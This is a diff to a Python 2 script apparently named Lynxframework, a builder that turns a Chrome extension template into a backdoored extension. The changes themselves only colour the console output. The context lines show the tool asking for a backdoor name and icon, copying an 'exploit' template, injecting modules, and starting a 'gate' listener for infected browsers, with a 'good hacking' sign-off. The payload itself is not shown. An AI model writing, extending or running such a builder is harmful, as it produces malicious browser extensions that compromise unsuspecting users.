@@ -5,6 +5,16 @@ import shutil
 import errno
 import glob
 
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
 def copy(src, dest):
     try:
         shutil.copytree(src, dest)
@@ -16,7 +26,7 @@ def copy(src, dest):
 
 def load_module(backdoor_name):
 	action = 0
-	print "[+] Loading..."
+	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Loading..."
 	print "---------------"
 	directory_list = glob.glob('includes/module/*.lframework')
 	for line in directory_list:
@@ -39,15 +49,15 @@ def load_module(backdoor_name):
 					if "//MODULE//" in line:
 						line = line.replace("//MODULE//", load_module_content)
 					load_check.write(line)
-				print '[+] Module writed! '
+				print '['+bcolors.OKGREEN +'+'+ bcolors.ENDC+'] Module writed! '
 				action = 1
-				print "[~] Bye, & good hacking."
+				print "["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Bye, & good hacking."
 
 def making(information_array):
 	output_name = raw_input('Output Name : ')
 	if output_name != '':
 		if information_array['type_backdoor'] == 'G':
-			print "\n[~] Google Chrome"
+			print "\n["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Google Chrome"
 			copy('includes/exploit/chrome', 'output/'+output_name)
 			if os.path.isfile('includes/exploit/icons/' + information_array['icon']):
 				copy('includes/exploit/icons/' + information_array['icon'], 'output/'+output_name+'/img/')
@@ -62,10 +72,10 @@ def making(information_array):
 				for line in basic_manifest:
 					if "//NAME//" in line:
 						line = line.replace("//NAME//", information_array['title'])
-						print "[+] Setup name.."
+						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup name.."
 					if "//DESCRIPTION//" in line:
 						line = line.replace("//DESCRIPTION//", information_array['description'])
-						print "[+] Setup description"
+						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup description"
 					if "//VERSION//" in line:
 						line = line.replace("//VERSION//", information_array['version'])
 					if "@@ICON@@" in line:
@@ -76,11 +86,11 @@ def making(information_array):
 			if user_input == '' or user_input == 'Y' or user_input == 'y':
 				load_module(output_name)
 			else:
-				print "\n[~] Bye, & good hacking."
+				print "\n["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Bye, & good hacking."
 
 
 		elif information_array['type_backdoor'] == 'F':
-			print "[~] Mozilla Firefox"
+			print "["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Mozilla Firefox"
 
 def backdooring(backdoor_type):
 	backdoor_information = {}
@@ -91,7 +101,7 @@ def backdooring(backdoor_type):
 	backdoor_information['type_backdoor'] = backdoor_type
 	action = 0
 
-	print "[+] Now configuring aspect..."
+	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Now configuring aspect..."
 	while action == 0:
 		backdoor_information['title'] = raw_input('Backdoor Name : ')
 		if backdoor_information['title'] != '':
@@ -110,15 +120,15 @@ def backdooring(backdoor_type):
 						else:
 							start = 0
 						if start == 1:
-							print "[+] Generation...."
+							print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Generation...."
 							action = 1
 							making(backdoor_information)
 						else:
 							print "[-] Icon not found"
 
 def generate_backdoor():
-	print "-> [G]oogle Chrome"
-	print "-> [M]ozilla Firefox"
+	print "-> ["+bcolors.OKBLUE +"G"+ bcolors.ENDC+"]oogle Chrome"
+	print "-> ["+bcolors.OKBLUE +"M"+ bcolors.ENDC+"]ozilla Firefox"
 	user_input = raw_input('\nLynxframework > ')
 
 	if user_input == 'g' or user_input == 'G':
@@ -131,15 +141,17 @@ def gate_listing():
 		os.system('python Lynxgate.py')
 
 def menu():
-	print "-> [G]enerate a extension backdoored."
-	print "-> [S]tart a gate listening."
-	print "-> [L]oad a lframework module."
-	print "-> [C]ompact extension with backdoor."
+	print "-> ["+bcolors.OKBLUE +"G"+ bcolors.ENDC+"]enerate a extension backdoored."
+	print "-> ["+bcolors.OKBLUE +"S"+ bcolors.ENDC+"]tart a gate listening."
+	print "-> ["+bcolors.OKBLUE +"L"+ bcolors.ENDC+"]oad a lframework module."
+	print "-> ["+bcolors.OKBLUE +"C"+ bcolors.ENDC+"]ompact extension with backdoor."
 	user_input = raw_input('\nLynxframework > ')
 	if user_input == 'g' or user_input == 'G':
 		generate_backdoor()
 	elif user_input == 's' or user_input == 'S':
 		gate_listing()
+
+
 
 def main():
 	logo = """
